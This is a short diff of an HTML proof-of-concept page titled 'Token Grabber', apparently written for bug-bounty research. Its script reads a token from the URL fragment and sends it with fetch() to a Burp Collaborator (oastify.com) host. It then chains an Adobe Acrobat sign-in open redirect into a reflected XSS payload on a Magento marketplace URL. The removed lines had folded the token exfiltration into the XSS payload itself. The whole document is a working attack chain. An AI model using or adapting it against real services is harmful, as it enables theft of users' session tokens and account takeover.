@@ -3,19 +3,20 @@
 <head><title>Token Grabber</title></head>
 <body>
 <script>
+  // Grab the token from fragment
   const token = window.location.hash;
 
-  // Encode token into XSS payload
+  // Exfil to Burp Collaborator
+  fetch("https://gvfuf7vd0p801l2va7hiuss1us0lobc0.oastify.com/?token=" + encodeURIComponent(token));
+
+  // Redirect to Acrobat open redirect → Magento XSS
   const xss = "https://marketplace.magento.com/extensions.html?p=2%22%3E" +
-              "<svg/onload=fetch('https://lwlzgcwi1u952q30bcinvxt6vx1ppgd5.oastify.com?token=" +
-              encodeURIComponent(token) + "')>";
+              "<svg/onload=alert(document.domain)>";
 
-  // Acrobat open redirect
-  const redirect = "https://acrobat.adobe.com/dc-chrome-extension/sign-in.html?main_op=googleSignIn" +
-                   "&source=ContinueWithGoogle%3AEmbedViewer&application=google&locale=en-GB" +
-                   "&callingApp=efaidnbmnnnibpcajpcglclefindmkaj&pdfUrl=" + encodeURIComponent(xss);
+  const acrobatRedirect = "https://acrobat.adobe.com/dc-chrome-extension/sign-in.html?main_op=googleSignIn&pdfUrl=" +
+                          encodeURIComponent(xss);
 
-  window.location.href = redirect;
+  window.location.href = acrobatRedirect;
 </script>
 </body>
 </html>
